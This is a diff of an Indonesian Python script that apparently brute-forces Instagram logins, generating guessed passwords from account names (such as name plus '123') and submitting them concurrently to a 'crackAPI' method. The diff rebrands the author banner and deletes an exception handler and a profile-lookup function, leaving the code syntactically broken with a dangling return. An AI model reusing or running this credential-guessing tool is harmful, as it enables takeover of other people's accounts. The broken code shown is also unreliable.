@@ -12,7 +12,6 @@ try:
 	import requests
 	import stdiomask
 	import urllib.request
-except ImportError as e:
 	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
 
 from time import sleep
@@ -280,9 +279,9 @@ class instagram:
 {P}-----------------------------------------------------          
 {P}[•] ＥＭＡＩＬ    : nazrihengker28@gmail.com
 {P}[•] ＪＯＩＮ   : -
-{P}[•] ＳＴＡＴＵＳ      : Premium Jelas Dong
-{P}[•] ＫＡＤＡＬＵＡＲＳＡ  : SAMPE TURU!
-{P}[•] ＡＵＴＨＯＲ      : NAZRI-XD
+{P}[•] ＳＴＡＴＵＳ      : Premium
+{P}[•] ＫＡＤＡＬＵＡＲＳＡ  : SAMPE Mampus
+{P}[•] ＡＵＴＨＯＲ      : Lha Batil-XD
 {P}------------------------------------------------------
 
 {P} Menu pilih Satu-satu :
@@ -453,20 +452,10 @@ class instagram:
 								else:
 									sandi=[w+'123',w,password.lower()]
 							shinkai.submit(self.crackAPI,username,sandi,uaAPI)
-				except:
-					pass
-		exit(f'\n\n [{K}|{C}] Crack Selesai...Ajg!!!')
+				
+					
 
-	def APIinfo(self,user):
-		try:
-			x=s.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
-			x_jason=x.json()["graphql"]["user"]
-			nama=x_jason["full_name"]
-			pengikut=x_jason["edge_followed_by"]["count"]
-			mengikut=x_jason["edge_follow"]["count"]
-			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
-		except:
-			pass
+	
 
 		return nama,pengikut,mengikut,postingan
 
